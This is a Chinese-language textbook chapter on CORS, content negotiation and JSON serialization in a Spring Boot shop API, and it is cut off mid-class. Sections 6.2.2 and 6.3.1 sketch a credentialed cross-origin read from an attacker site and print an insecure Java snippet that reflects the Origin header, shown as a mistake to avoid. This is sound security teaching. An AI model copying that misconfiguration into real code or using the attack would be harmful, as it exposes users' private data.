# 第 06 章：CORS、內容協商與序列化

> 前五章把 API 的**內容**做對了：路由、驗證、錯誤格式、追蹤、檔案。
> 這一章處理**內容跨越邊界時發生的事**。
>
> 三個邊界：
> - **瀏覽器的同源邊界** —— CORS。做錯的話，前端拿不到你 03 章精心設計的 Problem JSON，
>   只看到一句 `Network Error`。
> - **格式邊界** —— 內容協商。客戶端要 CSV，你只會給 JSON，該回 406 還是 415？
> - **型別邊界** —— 序列化。`BigDecimal("1280.50")` 到了 JavaScript 會變成什麼？
>   `LocalDateTime` 沒有時區，那對帳要用誰的時間？
>
> **這三件事的共同特徵：它們都在「你的程式碼跑完之後」才出錯**，
> 所以單元測試全綠，而正式環境壞掉。

---

## 6.1 學習目標

完成本章後，你應該可以：

- **說明同源政策擋的到底是什麼**（提示：不是「請求送不出去」），以及那對 API 設計的意義。
- 精確判斷一個請求會不會觸發 preflight，並說出三個判準。
- 說出 CORS 的每一個回應標頭的作用，包含最容易漏的 `Access-Control-Expose-Headers`。
- **說明為什麼 `Access-Control-Allow-Headers: *` 不涵蓋 `Authorization`**。
- 說出 Spring 的四種 CORS 設定方式、它們的優先順序，以及**它們各自在 filter chain 的哪個位置生效**。
- **回答「為什麼 04 章那些 filter 產生的錯誤回應沒有 CORS 標頭」**，並修好它。
- 說明 `response.reset()` 為什麼會弄掉 CORS 標頭（03 章 `ProblemWriter` 的一個真實 bug）。
- 說出 `allowedOrigins` 與 `allowedOriginPatterns` 的差別，以及 `Vary: Origin` 為什麼必要。
- 說明「CORS 不是安全機制」，並指出三個常見的誤用。
- 說出 `Accept` 的 q 值排序規則與 Spring 的選擇演算法，並判斷 406 vs 415。
- **知道 Boot 3 已經移除 path extension 內容協商**，以及那對舊專案升級的影響。
- 寫一個自訂 `HttpMessageConverter`，並知道 **`configureMessageConverters` 會弄掉 Range 支援**（05 章 5.8.3）。
- 說明 `ObjectMapper` 在 Spring Boot 裡是怎麼組出來的，以及**為什麼永遠不要 `new ObjectMapper()`**。
- 列出 shop-service 的完整 Jackson 設定，並為**每一項**說出理由。
- 說出 `BigDecimal` 在 JSON 裡的三個坑，以及為什麼 shop-service 用字串表示金額。
- **實作「未知 enum 值不讓 App 崩潰」的雙向防護**（03-rest-api 第 00 章 0.8.3 的落地修法）。
- 寫自訂 serializer / deserializer，並知道它們與 `@JsonFormat`、`Converter` 的分工。
- 用 `ResponseBodyAdvice` 實作稀疏欄位集，並說出它與 05 章串流的衝突。
- 說出三種序列化的安全問題（多型反序列化、深度炸彈、資訊洩漏）與防法。
- 說明 `HttpMessageNotWritableException` 為什麼特別難處理。
- 決定 ETag 該由 `ShallowEtagHeaderFilter` 算還是自己算，並說出成本。

---

## 6.2 先看見痛：四次真實事故

### 6.2.1 事故一：前端看到的所有錯誤都是「Network Error」

**背景**：03 章花了 6,600 行做出一套精美的錯誤格式：

```json
{
  "type": "https://api.shop.example/problems/insufficient-stock",
  "title": "庫存不足",
  "status": 409,
  "code": "INSUFFICIENT_STOCK",
  "userMessage": "「無線滑鼠」目前只剩 2 件，請調整數量。",
  "retryable": true,
  "retryStrategy": "MODIFY_REQUEST",
  "traceId": "4f2c8a1e9b3d7c05",
  "availableQuantity": 2,
  "requestedQuantity": 5
}
```

**前端工程師的回報**：

> 「後端說會回一個很詳細的錯誤物件，但我完全拿不到。
> `catch` 到的是 `TypeError: Failed to fetch`，
> console 只有一行紅字：
> `Access to fetch at 'https://api.shop.example/orders' from origin 'https://shop.example'
> has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present.`
>
> 所以我只能顯示『系統發生問題，請稍後再試』。」

**而詭異的是**：成功的請求完全正常，**只有錯誤的請求會這樣**。

**Chrome devtools 的 Network 分頁**：

```
POST /orders    (failed) net::ERR_FAILED
                狀態：429
                Response headers:
                  content-type: application/problem+json
                  x-trace-id: 4f2c8a1e9b3d7c05
                  retry-after: 30
                  （沒有 access-control-allow-origin）    ← 🔴
```

**回應是對的！狀態碼、body、標頭全都對。**
但**瀏覽器拒絕讓 JavaScript 讀它**，因為缺少 `Access-Control-Allow-Origin`。

**為什麼只有錯誤會這樣？** 看 04 章 4.13.1 的 filter 順序表：

```
order   filter                          誰產生錯誤回應
────────────────────────────────────────────────────────────
-121    TraceIdFilter
-120    TrailingSlashRedirectFilter     308 轉址
-119    IpRateLimitFilter               ★ 429（用 ProblemWriter）
-118    RequestSizeLimitFilter          ★ 413（用 ProblemWriter）
-117    CachedBodyFilter
-116    RequestLoggingFilter
-115    AuditFilter
-105    RequestContextFilter（Boot）
-100    springSecurityFilterChain       ← ★★ CorsFilter 在這裡面
                                          401 / 403
 -99    IdempotencyFilter               ★ 409（用 ProblemWriter）
        ↓
        DispatcherServlet
        ↓
        Controller → advice → 4xx / 5xx    ← 這些「之後」才被 CorsFilter 處理？不，
                                              CorsFilter 在請求進來時就設好標頭了
```

**關鍵**：`CorsFilter` 在 order **-100**（Spring Security 內）。
而 `IpRateLimitFilter`（-119）與 `RequestSizeLimitFilter`（-118）
**在它之前就把回應寫完並 return 了** ——
`CorsFilter` 從來沒有執行過，所以沒有人加 `Access-Control-Allow-Origin`。

**而 Controller 拋的例外沒問題**，因為那時 `CorsFilter` 早就跑過了
（它在請求進入時就把標頭設在 response 上）。

⚠️ **所以症狀是「只有某些錯誤看不到」** —— 而那正好是最需要看到的那些
（限流、檔案太大、冪等衝突）。

**第二個更隱蔽的問題**：03 章 3.10.1 的 `ProblemWriter`：

```java
    private void writeProblem(HttpServletResponse response, Problem problem, ...) {
        if (response.isCommitted()) { ... return; }
        response.reset();                        // 🔴🔴 這一行
        response.setStatus(problem.status());
        ...
    }
```

**`HttpServletResponse.reset()` 會清空所有已設定的標頭。**

所以即使 `CorsFilter` 已經跑過並設好了 `Access-Control-Allow-Origin`，
**只要錯誤是透過 `ProblemWriter` 寫的，那個標頭就被清掉了。**

⚠️ 這影響的範圍比第一個問題大得多：
`ProblemWriter` 被 Filter、Spring Security 的 `AuthenticationEntryPoint`
與 `AccessDeniedHandler` 共用（03 章 3.10.2）——
**也就是說「所有 401 與 403 的回應，前端都讀不到內容」。**

**登入過期時，使用者看到的是「系統發生問題」而不是「請重新登入」。**

### 6.2.2 事故二：`*` + credentials 的無效修法

**上一個事故的「修法」**（某位工程師在 Stack Overflow 找到的）：

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedOrigins("*")            // 🔴
                .allowedMethods("*")
                .allowedHeaders("*")
                .allowCredentials(true);        // 🔴
    }
}
```

**啟動時直接爆炸**：

```
java.lang.IllegalArgumentException: When allowCredentials is true,
allowedOrigins cannot contain the special value "*" since that cannot be set
on the "Access-Control-Allow-Origin" response header.
To allow credentials to a set of origins, list them explicitly or consider
using "allowedOriginPatterns" instead.
```

⚠️ **Spring 幫你擋住了一個真實的安全漏洞**。如果它沒擋：

```
① 攻擊者架一個網站 evil.example
② 受害者（已登入 shop.example）訪問 evil.example
③ evil.example 的 JS 執行：
     fetch('https://api.shop.example/me/orders', { credentials: 'include' })
④ 瀏覽器帶著受害者的 cookie 送出請求
⑤ 如果回應有 Access-Control-Allow-Origin: * + Allow-Credentials: true
   → 🔴 evil.example 讀到了受害者的完整訂單紀錄（含地址、電話）
```

**「所以我改成這樣」**（第二次錯誤的修法）：

```java
    // 🔴 更糟：把 Origin 直接反射回去
    response.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"));
    response.setHeader("Access-Control-Allow-Credentials", "true");
```

**這比 `*` 危險**，因為它繞過了規格的保護：
`*` 至少在有 credentials 時會被瀏覽器拒絕，
而「反射 Origin」讓**任何**網站都通過 —— **這就是上面的攻擊 ⑤，只是被手動實作出來**。

### 6.2.3 事故三：對帳差了 8 小時，還有一筆金額變成 `1.2805E+3`

**財務部門的工單**：

> 「7 月的對帳表跟金流商的差 47 筆。
> 我們的紀錄說是 8/1 的訂單，金流商說是 7/31。」

**原因**：

```java
// DTO
public record OrderSummary(
    String orderId,
    LocalDateTime createdAt,      // 🔴 LocalDateTime 沒有時區
    BigDecimal total              // 🔴 JSON number
) {}
```

```json
{
  "orderId": "ord_01k1",
  "createdAt": "2026-08-01T02:30:00",
  "total": 1280.5
}
```

**三個問題疊在一起**：

| # | 問題 | 後果 |
|---|---|---|
| 1 | `LocalDateTime` 沒有時區資訊 | 前端與財務都**假設它是台北時間**，但它其實是 UTC。`2026-08-01T02:30` UTC = 台北 `10:30`。**而 7/31 23:30 台北 = 8/1 15:30 UTC** → 跨月的訂單被算到錯的月份 |
| 2 | 金額用 JSON number | `1280.50` 序列化成 `1280.5`（尾數 0 消失）→ 財務的 Excel 顯示 `1280.5`，跟金流商的 `1280.50` 對不上（人工核對時被當成不同的數字） |
| 3 | 某一筆特別大的金額 | `BigDecimal("1E+7")`（來自某個計算）序列化成 **`1.0E+7`**，前端的 `parseFloat` 勉強能讀，**但寫進 CSV 之後 Excel 顯示 `1.0E+07`** |

**第 3 個問題的來源**：

```java
BigDecimal a = new BigDecimal("10000000");
BigDecimal b = new BigDecimal("1");
System.out.println(a.multiply(b).toString());          // → 10000000    ✅
System.out.println(a.divide(b).toString());            // → 10000000    ✅

// 但…
BigDecimal c = new BigDecimal("1E+7");                 // 從某個外部系統來的字串
System.out.println(c.toString());                      // → 1E+7        🔴
System.out.println(c.toPlainString());                 // → 10000000    ✅

// 而 Jackson 預設用 toString()
```

⚠️ **`BigDecimal.toString()` 的科學記號行為不是 bug，是規格**
（`BigDecimal` 的 `scale` 為負數時就會用科學記號）。
而**任何**經過 `stripTrailingZeros()` 的值都可能變成負 scale：

```java
new BigDecimal("100.00").stripTrailingZeros().toString();   // → "1E+2"   🔴🔴
```

**很多人為了「讓 100.00 顯示成 100」而呼叫 `stripTrailingZeros()`，
結果得到 `1E+2`。**

### 6.2.4 事故四：新增一個訂單狀態，App 全部崩潰

**這是 03-rest-api 第 00 章 0.8.3 那個事故的續集** —— 這次要看實作層面。

**改動**：物流商支援「部分出貨」，所以在 `OrderStatus` 加一個值：

```java
public enum OrderStatus {
    PENDING_PAYMENT, PAID,
    PARTIALLY_SHIPPED,        // ★ 新增
    SHIPPED, DELIVERED, CANCELLED, REFUNDED
}
```

**後端**：一行程式碼、一次部署、測試全綠。

**四小時後**：

```
App Store 評論（1 星）× 340 則
「訂單頁面一打開就閃退」

Crashlytics：
  Fatal Exception: com.squareup.moshi.JsonDataException
  Expected one of [PENDING_PAYMENT, PAID, SHIPPED, DELIVERED, CANCELLED, REFUNDED]
  but was PARTIALLY_SHIPPED at path $.items[3].status
```

⚠️ **iOS App 的 Swift `Codable` 與 Android 的 Moshi 對未知 enum 值的預設行為都是「拋例外」**，
而那個例外發生在**整個回應的解析過程中** ——
所以不是「那一筆訂單顯示不出來」，而是**整個訂單列表都拿不到**。

**而後端的反序列化方向也有一樣的問題**：

```http
GET /orders?status=PARTIALLY_SHIPPPED      ← 使用者打錯字（三個 P）
```

Spring 的 enum 轉換失敗 → `MethodArgumentTypeMismatchException` → 400。
**訊息長這樣**：

```
Failed to convert value of type 'java.lang.String' to required type
'example.shop.order.domain.OrderStatus'; Failed to convert from type
[java.lang.String] to type [@RequestParam OrderStatus] for value
[PARTIALLY_SHIPPPED]
```

**這段訊息對使用者毫無幫助**，而且它洩漏了內部類別名稱（03 章 3.11.2）。

### 6.2.5 這四個痛的共同點

| 事故 | 表面問題 | 真正的問題 |
|---|---|---|
| Network Error | CORS 標頭沒設 | **「錯誤路徑」與「成功路徑」經過不同的程式碼** |
| `*` + credentials | 設定寫錯 | **不知道同源政策在防什麼** |
| 對帳差 8 小時 | 型別選錯 | **假設「序列化是無損的」** |
| App 崩潰 | 新增 enum 值 | **假設「客戶端會跟著改」** |

**四個都是「邊界的另一側」的問題** ——
而你的單元測試永遠只測邊界的這一側。

---

## 6.3 CORS 完整機制

### 6.3.1 同源政策擋的到底是什麼 ★

**最常見的誤解**：「CORS 擋住了我的請求。」

**事實：對簡單請求（simple request），請求已經送到伺服器並執行了。
瀏覽器擋的是「讓 JavaScript 讀回應」。**

```
① evil.example 的 JS 執行 fetch('https://api.shop.example/me/orders')
② 瀏覽器【送出請求】—— 帶上 Origin: https://evil.example
③ 伺服器【執行了】—— 查了資料庫、寫了 log、扣了限流配額
④ 伺服器回 200 + 訂單資料
⑤ 瀏覽器檢查回應有沒有 Access-Control-Allow-Origin: https://evil.example
⑥ 沒有 → 瀏覽器【丟掉回應】，讓 fetch 的 Promise reject
   ★ JS 完全拿不到任何資訊（連狀態碼都不知道）
```

**這個機制的三個重要推論**：

| 推論 | 說明 |
|---|---|
| **① 副作用已經發生** | `POST /orders` 即使被 CORS 擋住，訂單**可能已經建立了**。所以 CORS 不能當成「防止未授權操作」的手段 |
| **② 這就是 CSRF 的機制** | CSRF 攻擊不需要讀回應 —— 它只需要「請求被執行」。所以 **CORS 不防 CSRF**（要用 CSRF token 或 SameSite cookie） |
| **③ 錯誤回應也需要 CORS 標頭** | 6.2.1 的事故 —— 瀏覽器對 4xx / 5xx 的檢查與 200 完全相同 |

⚠️ **但「preflight」的情況不同**：

```
① evil.example 的 JS 執行
     fetch('https://api.shop.example/orders', {
       method: 'DELETE',
       headers: { 'Authorization': 'Bearer ...' }
     })
② 瀏覽器發現這不是簡單請求 → 先送 preflight：
     OPTIONS /orders
     Origin: https://evil.example
     Access-Control-Request-Method: DELETE
     Access-Control-Request-Headers: authorization
③ 伺服器回應（不含 Allow-Origin，或不含 DELETE）
④ 瀏覽器【不送出真正的請求】
   ★ 這種情況下伺服器真的沒有執行 DELETE
```

**所以 preflight 確實「保護」了非簡單請求。**
但那是**副作用**，不是設計目的 —— 設計目的是「詢問伺服器願不願意」。

**一張圖說清楚**：

```
                    ┌───────────────────────────────────────┐
                    │  這是簡單請求嗎？（6.3.2 的三個判準）    │
                    └───────────┬───────────────────────────┘
                     是 ────────┴──────── 否
                     │                     │
        ┌────────────▼──────────┐  ┌───────▼────────────────────┐
        │ 直接送出真正的請求      │  │ 先送 OPTIONS preflight      │
        │ 伺服器【會執行】 ★      │  │ 伺服器【不執行業務邏輯】     │
        └────────────┬──────────┘  └───────┬────────────────────┘
                     │                     │ 通過？
                     │              是 ────┴──── 否
                     │              │            │
                     │   ┌──────────▼──────┐  ┌──▼────────────────┐
                     │   │ 送出真正的請求    │  │ 不送。JS 收到錯誤  │
                     │   │ 伺服器會執行      │  │ 伺服器完全沒執行   │
                     │   └──────────┬──────┘  └───────────────────┘
                     └──────────────┤
                     ┌──────────────▼─────────────────────┐
                     │ 回應有 Access-Control-Allow-Origin  │
                     │ 且值符合這個 Origin 嗎？             │
                     └──────────────┬─────────────────────┘
                        是 ─────────┴───────── 否
                        │                       │
              ┌─────────▼────────┐   ┌──────────▼──────────────────┐
              │ JS 讀到回應 ✅     │   │ JS 收到 TypeError            │
              │ （但只能讀到       │   │ 「Failed to fetch」          │
              │  expose 的標頭）   │   │ ★ 連狀態碼都拿不到（6.2.1）   │
              └──────────────────┘   └─────────────────────────────┘
```

### 6.3.2 simple request vs preflight 的三個判準

一個請求是「簡單請求」（不需要 preflight）**必須同時滿足**：

**判準 1：方法是 `GET`、`HEAD`、`POST` 之一**

```
GET     ✅
HEAD    ✅
POST    ✅
PUT     ❌ → preflight
PATCH   ❌ → preflight
DELETE  ❌ → preflight
OPTIONS ❌ （它本身就是 preflight 用的）
```

**判準 2：所有標頭都在 CORS 安全清單（CORS-safelisted request headers）裡**

| 安全清單標頭 | 限制 |
|---|---|
| `Accept` | 不可含 CORS-unsafe 的位元組 |
| `Accept-Language` | 同上 |
| `Content-Language` | 同上 |
| `Content-Type` | ⚠️ 只有三個值（判準 3） |
| `Range` | 只能是簡單的 `bytes=x-y` 形式 |

**任何其他標頭都會觸發 preflight**，包括：

```
Authorization        ❌ → preflight      ★ 這是最重要的一個
X-Trace-Id           ❌ → preflight
Idempotency-Key      ❌ → preflight
X-Requested-With     ❌ → preflight
```

⚠️ **所以 shop-service 的每一個 API 請求都會 preflight** ——
因為每一個都帶 `Authorization: Bearer ...`。

**判準 3：`Content-Type` 只能是這三個值之一**

```
application/x-www-form-urlencoded   ✅
multipart/form-data                 ✅
text/plain                          ✅

application/json                    ❌ → preflight   ★★
application/merge-patch+json        ❌ → preflight
```

⚠️ **`application/json` 不在安全清單裡是一個刻意的設計**：
表單能送的三種型別，HTML 的 `<form>` 本來就能跨站送（歷史包袱），
所以把 JSON 排除在外，讓「JSON API」預設受到 preflight 的保護。

**shop-service 的實際情況**：

| 請求 | preflight？ | 為什麼 |
|---|---|---|
| `GET /products`（公開，無認證） | ❌ 不用 | GET + 無自訂標頭 |
| `GET /orders`（帶 Bearer） | ✅ **要** | `Authorization` 不在安全清單 |
| `POST /orders`（JSON + Bearer） | ✅ 要 | 兩個理由都成立 |
| `POST /products/P-1/images`（multipart + Bearer） | ✅ 要 | `Authorization` |
| `GET /orders/ord_1/events`（SSE，`EventSource`） | ❌ **不用** | ⚠️ `EventSource` **不能設標頭**，所以它一定是簡單請求（這正是 05 章 5.11.9 的限制來源） |

⚠️ **最後一列是一個重要的連結**：`EventSource` 不能帶 `Authorization`
→ 它是簡單請求 → 不會 preflight →
**但它也就無法用 Bearer token 認證**（只能靠 cookie）。

**Preflight 的成本**：

```
每個 API 請求 = 2 次往返（preflight + 實際請求）
台北 → 東京的 RTT 約 35 ms
→ 每個請求多 35 ms

一個頁面打 8 支 API：
  沒有 preflight 快取：8 × 35 = 280 ms 的額外延遲
  有 Access-Control-Max-Age：第一次之後就 0
```

⚠️ **`Access-Control-Max-Age` 有瀏覽器上限**：

| 瀏覽器 | 上限 |
|---|---|
| Chrome / Edge | **7200 秒（2 小時）** |
| Firefox | 86400 秒（24 小時） |
| Safari | 依版本，通常較小 |

**設 `86400` 在 Chrome 上會被夾成 `7200`**（不會報錯，只是靜默夾取）。
**所以設 `7200` 就好** —— 設更大只是誤導讀設定的人。

⚠️ **preflight 快取的 key 包含「方法 + 標頭組合」**：
`GET` 的 preflight 結果不能給 `DELETE` 用。
所以一個頁面如果有 GET / POST / PATCH / DELETE，就會有 4 次 preflight。

### 6.3.3 每一個標頭的作用

**Preflight 請求（瀏覽器送）**：

| 標頭 | 說明 |
|---|---|
| `Origin` | 發起的來源（`scheme://host:port`）。⚠️ **沒有路徑** |
| `Access-Control-Request-Method` | 真正要用的方法 |
| `Access-Control-Request-Headers` | 真正要送的自訂標頭（**小寫、逗號分隔、字典序**） |

**Preflight 回應（伺服器送）**：

| 標頭 | 必要？ | 說明 |
|---|---|---|
| `Access-Control-Allow-Origin` | ✅ | 單一 origin 或 `*`。⚠️ **不能是清單** |
| `Access-Control-Allow-Methods` | ✅ | 允許的方法（逗號分隔） |
| `Access-Control-Allow-Headers` | ⚠️ 有自訂標頭時要 | 允許的請求標頭 |
| `Access-Control-Allow-Credentials` | 要帶 cookie 時 | 只能是 `true`（沒有 `false` —— 不允許就不要送這個標頭） |
| `Access-Control-Max-Age` | 建議 | preflight 的快取秒數 |
| `Vary: Origin` | ✅ **必要** | 6.3.8 |

**實際回應（伺服器送）**：

| 標頭 | 說明 |
|---|---|
| `Access-Control-Allow-Origin` | ✅ **實際回應也要！**（很多人只在 preflight 設） |
| `Access-Control-Allow-Credentials` | 同上 |
| **`Access-Control-Expose-Headers`** | ★ **最容易漏的一個**（見下） |
| `Vary: Origin` | 必要 |

### `Access-Control-Expose-Headers`：最容易漏的一個 ★

**跨來源請求的 JavaScript 預設只能讀七個回應標頭**：

```
Cache-Control
Content-Language
Content-Length
Content-Type
Expires
Last-Modified
Pragma
```

**其他全部讀不到** —— 而且是「靜默地讀不到」：

```javascript
const response = await fetch('https://api.shop.example/orders', { method: 'POST', ... });

console.log(response.status);                          // → 201 ✅
console.log(response.headers.get('Location'));         // → null 🔴
console.log(response.headers.get('X-Trace-Id'));       // → null 🔴
console.log(response.headers.get('ETag'));             // → null 🔴
console.log(response.headers.get('Retry-After'));      // → null 🔴
```

**這破壞了前五章的多個設計**：

| 標頭 | 誰需要它 | 讀不到的後果 |
|---|---|---|
| `Location` | `POST /orders` 之後導向新訂單 | 前端只能自己組 URL（或從 body 拿 id）|
| **`X-Trace-Id`** | 04 章 4.5.4：讓使用者能提供給客服 | **整個 traceId 機制在瀏覽器端失效** |
| `ETag` | 6.8：條件請求、樂觀鎖 | 前端無法送 `If-Match` |
| `Retry-After` | 03-rest-api 8.4.5：限流的重試指引 | 前端不知道等多久（只能瞎猜） |
| `X-RateLimit-Remaining` | 讓前端顯示配額 | 功能做不出來 |
| `X-Total-Count` | 05 章 5.9.2：匯出的筆數 | 無法驗證完整性 |
| `Content-Disposition` | 05 章 5.8.1：下載檔名 | **前端 blob 下載時拿不到檔名** |
| `Idempotent-Replay` | 04 章 4.9.5：除錯用 | 測試無法驗證冪等 |

⚠️ **`Content-Disposition` 這一列特別值得注意**：
05 章 5.10.6 的「前端用 `fetch` + `blob` 下載」需要從
`Content-Disposition` 取檔名 —— **沒 expose 就拿不到，檔案會存成 `download`**。

**所以 shop-service 必須 expose 一整組標頭**（6.3.9 會給完整清單）。

### `Access-Control-Allow-Headers: *` 的陷阱 ★

```java
    // 看起來很方便
    config.setAllowedHeaders(List.of("*"));
```

⚠️ **`*` 在 `Access-Control-Allow-Headers` 裡有兩個限制**：

**限制 1：`allowCredentials(true)` 時 `*` 無效。**
（和 `Allow-Origin` 同樣的道理 —— 帶憑證時不允許通配。）

**限制 2：即使不帶憑證，`*` 也【不涵蓋 `Authorization`】。**

這是 Fetch 規格的一個明確例外：

> The `Authorization` header is special-cased: a wildcard in
> `Access-Control-Allow-Headers` does not cover it.

```
瀏覽器送：  Access-Control-Request-Headers: authorization
伺服器回：  Access-Control-Allow-Headers: *
瀏覽器：    ❌ 拒絕（* 不涵蓋 authorization）
```

**症狀是「preflight 回 200 但實際請求還是被擋」** ——
極難查，因為 devtools 顯示 preflight 成功。

**所以 `Authorization` 必須被明確列出**：

```java
    config.setAllowedHeaders(List.of(
            "Authorization",              // ★ 一定要明確列出
            "Content-Type",
            "Accept",
            "Idempotency-Key",
            "X-Request-Id",
            "If-Match",
            "If-None-Match",
            "Last-Event-ID"));
```

### 6.3.4 Spring 的四種設定方式與它們的位置 ★

| 方式 | 生效位置 | 適用 |
|---|---|---|
| **① `@CrossOrigin`** | `HandlerMapping`（DispatcherServlet 內） | 🔴 幾乎不該用（見下） |
| **② `WebMvcConfigurer.addCorsMappings`** | `HandlerMapping` | ⚠️ 只在沒有 Spring Security 時夠用 |
| **③ `CorsConfigurationSource` bean + Security 的 `.cors()`** | Security filter chain（order -100 附近） | ✅ 有 Security 時的標準做法 |
| **④ 獨立的 `CorsFilter` bean + 自訂 order** | 你指定的 order | ✅ **shop-service 用這個**（6.3.6 的理由） |

**① `@CrossOrigin` 為什麼不該用**：

```java
    @CrossOrigin(origins = "https://shop.example")     // 🔴
    @GetMapping("/orders")
    public PageResponse<OrderSummary> list() { }
```

| 問題 | 說明 |
|---|---|
| **設定散落在 70 個端點上** | 要改允許的 origin 就得改 70 個檔案 |
| **漏掉一個就是一個 bug** | 而且是「某一支 API 在正式環境不能用」這種難查的 bug |
| **在 Security 之後才生效** | 未認證的請求（401）不會有 CORS 標頭 |
| **對 Filter 產生的錯誤無效** | 6.2.1 的問題 |

⚠️ **唯一合理的用途**：某一支端點需要**比全域更寬**的規則
（例如一個公開的 webhook 驗證端點）。
即使那樣，也應該寫在集中設定裡並加註解說明。

**② `addCorsMappings` 的位置問題**：

```java
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedOrigins("https://shop.example")
                .allowedMethods("GET", "POST", "PATCH", "DELETE", "OPTIONS")
                .allowCredentials(true)
                .maxAge(7200);
    }
}
```

**它註冊到 `AbstractHandlerMapping.corsConfigurationSource`** ——
也就是說**它在 `DispatcherServlet` 內部生效**。

```
Filter chain（所有 filter）
  ↓
DispatcherServlet
  ↓
HandlerMapping.getHandler()
  ├── 是 preflight（OPTIONS + Access-Control-Request-Method）？
  │     → 回傳一個 PreFlightHandler，直接寫 CORS 回應
  └── 一般請求 → 找到 handler，並包一個 CorsInterceptor 加標頭
```

**這代表**：

| 情況 | 有 CORS 標頭？ |
|---|---|
| Controller 正常回應 | ✅ |
| Controller 拋例外 → advice | ✅（`HandlerExecutionChain` 的 interceptor 已經加了） |
| **404（沒有 handler）** | ⚠️ 依版本而異 —— 沒有 handler 就沒有 CorsInterceptor |
| **Spring Security 擋掉（401/403）** | 🔴 **沒有**（Security 在 DispatcherServlet 之前） |
| **Filter 產生的錯誤（429/413）** | 🔴 **沒有** |

⚠️ **所以只用 `addCorsMappings` 的專案，401 的回應一定讀不到。**

**③ Spring Security 的 `.cors()`**：

```java
package example.shop.common.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.cors.CorsConfigurationSource;

@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http,
                                           CorsConfigurationSource corsSource)
            throws Exception {
        return http
                // ★ 這一行會在 filter chain 裡加一個 CorsFilter，
                //   位置在「認證之前」——所以 401 的回應也會有 CORS 標頭
                .cors(Customizer.withDefaults())
                // ⚠️ 沒有這一行的話，preflight 的 OPTIONS 請求會被
                //   認證擋掉 → 401 → 瀏覽器報 CORS 錯誤
                //   （因為 preflight 不會帶 Authorization！）
                .authorizeHttpRequests(auth -> auth
                        // ★ Spring Security 6 對 preflight 的處理：
                        //   .cors() 加的 CorsFilter 會攔截並直接回應 preflight，
                        //   所以不需要另外 permitAll OPTIONS。
                        //   ⚠️ 但如果你沒用 .cors() 而是用 addCorsMappings，
                        //      就必須明確放行：
                        //      .requestMatchers(HttpMethod.OPTIONS, "/**").permitAll()
                        .requestMatchers("/actuator/health").permitAll()
                        .anyRequest().authenticated())
                .build();
    }
}
```

⚠️ **`Customizer.withDefaults()` 會去找一個 `CorsConfigurationSource` bean。**
找不到的話它會退回去用 `addCorsMappings` 的設定
（透過 `HandlerMappingIntrospector`）—— 那個 fallback 的行為
在不同 Security 版本間有差異，**所以一定要明確提供 `CorsConfigurationSource` bean**。

**這個做法解決了 401/403，但還是沒解決 6.2.1 的兩個問題**：

```
order   filter
────────────────────────────────────────
-119    IpRateLimitFilter          🔴 429 沒有 CORS 標頭（在 -100 之前）
-118    RequestSizeLimitFilter     🔴 413 沒有 CORS 標頭
-100    springSecurityFilterChain  ← CorsFilter 在這裡
```

**而且 `ProblemWriter.reset()` 會清掉標頭**（6.2.1 的第二個問題）。

**④ shop-service 的做法：獨立的 `CorsFilter`，order 排在所有 filter 之前**

（完整實作在 6.3.6。）

### 6.3.5 錯誤回應也要有 CORS 標頭：完整修法 ★★

**問題重述**（6.2.1）：

| 問題 | 原因 |
|---|---|
| A | order -119 / -118 的 filter 在 `CorsFilter`（-100）之前寫完回應就 return |
| B | `ProblemWriter.reset()` 清掉了已設定的 CORS 標頭 |

**修 A：把 `CorsFilter` 排在所有自訂 filter 之前。**

```java
package example.shop.common.config;

import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;

import java.util.List;

/**
 * CORS 設定。
 *
 * <p>★★ 這個類別的核心決定：<b>用一個獨立的 {@link CorsFilter}，
 * 排在「所有」自訂 filter 之前</b>（order = -200）。
 *
 * <p>為什麼不用 {@code addCorsMappings} 或只用 Security 的 {@code .cors()}：
 * <table>
 *   <tr><th>回應來源</th><th>addCorsMappings</th><th>Security .cors()</th>
 *       <th>獨立 filter (-200)</th></tr>
 *   <tr><td>Controller 正常回應</td><td>✅</td><td>✅</td><td>✅</td></tr>
 *   <tr><td>advice 的 4xx/5xx</td><td>✅</td><td>✅</td><td>✅</td></tr>
 *   <tr><td>404（無 handler）</td><td>⚠️</td><td>✅</td><td>✅</td></tr>
 *   <tr><td>Security 的 401/403</td><td>🔴</td><td>✅</td><td>✅</td></tr>
 *   <tr><td><b>IpRateLimitFilter 的 429</b>（-119）</td>
 *       <td>🔴</td><td>🔴</td><td><b>✅</b></td></tr>
 *   <tr><td><b>RequestSizeLimitFilter 的 413</b>（-118）</td>
 *       <td>🔴</td><td>🔴</td><td><b>✅</b></td></tr>
 *   <tr><td>TrailingSlashRedirectFilter 的 308（-120）</td>
 *       <td>🔴</td><td>🔴</td><td><b>✅</b></td></tr>
 * </table>
 *
 * <p>⚠️ 這個 filter 與 Security 的 {@code .cors()} <b>可以並存</b>：
 * Spring 的 {@code DefaultCorsProcessor} 會檢查回應是否已經有
 * {@code Access-Control-Allow-Origin}，有就跳過。所以不會出現重複的標頭。
 * <b>但兩者必須共用同一個 {@link CorsConfigurationSource} bean</b>，
 * 否則規則會不一致（而且那種不一致只會在某些錯誤路徑上顯現，極難查）。
 */
@Configuration
public class CorsConfig {

    /**
     * ⚠️ 這個 order 必須小於 04 章所有自訂 filter 的 order。
     *
     * <p>04 章最小的是 {@code TraceIdFilter}（-121），所以 -200 有足夠餘裕。
     * <b>但不要用 {@code Ordered.HIGHEST_PRECEDENCE}</b>：
     * 那會排在 Boot 的 {@code ForwardedHeaderFilter} 之前，
     * 而我們（未來如果要依 {@code X-Forwarded-Proto} 判斷 origin）會需要它先跑。
     */
    public static final int CORS_FILTER_ORDER = -200;

    private final CorsProperties properties;

